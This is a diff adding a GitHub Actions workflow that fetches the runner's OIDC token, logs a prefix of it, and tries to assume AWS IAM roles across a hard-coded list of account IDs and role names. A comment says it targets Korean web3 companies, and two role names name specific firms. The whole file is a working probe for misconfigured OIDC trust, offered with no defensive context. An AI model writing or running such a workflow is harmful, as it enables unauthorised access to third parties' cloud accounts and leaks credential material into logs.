@@ -1,0 +1,56 @@
+name: STS Account Oracle
+on:
+  workflow_dispatch:
+    inputs:
+      account_range:
+        description: 'Account ID range to probe'
+        required: false
+        default: 'default'
+
+permissions:
+  id-token: write
+  contents: read
+
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Get OIDC Token and Probe STS Oracle
+        run: |
+          # Get the OIDC token from GitHub Actions OIDC endpoint
+          TOKEN=$(curl -sf -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
+            "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=sts.amazonaws.com" | python3 -c "import sys,json; print(json.load(sys.stdin)['value'])")
+          
+          echo "OIDC_TOKEN_OBTAINED=true token_prefix=${TOKEN:0:30}"
+          
+          # Install AWS CLI if not present
+          aws --version || pip install awscli -q
+          
+          # Candidate account IDs - focused list of plausible ranges for Korean web3 companies
+          CANDIDATES=(
+            "847111281529"
+            "123456789012"
+            "975050157552"
+            "211125461067"
+            "442042546671"
+            "730335619062"
+            "582318560589"
+            "492374225042"
+            "381491896068"
+            "941377116779"
+          )
+          
+          ROLES=("github-actions-role" "GitHubActionsRole" "github-actions-deploy" "deploy-role" "layerbank-github-actions" "deplanet-github-actions")
+          
+          for ACCT in "${CANDIDATES[@]}"; do
+            for ROLE in "${ROLES[@]}"; do
+              RESULT=$(aws sts assume-role-with-web-identity \
+                --role-arn "arn:aws:iam::${ACCT}:role/${ROLE}" \
+                --role-session-name sts-probe-test \
+                --web-identity-token "$TOKEN" \
+                --region us-east-1 2>&1 | head -3)
+              echo "::notice::PROBE ACCT=${ACCT} ROLE=${ROLE} RESULT=${RESULT}"
+            done
+          done
+        env:
+          AWS_DEFAULT_REGION: us-east-1
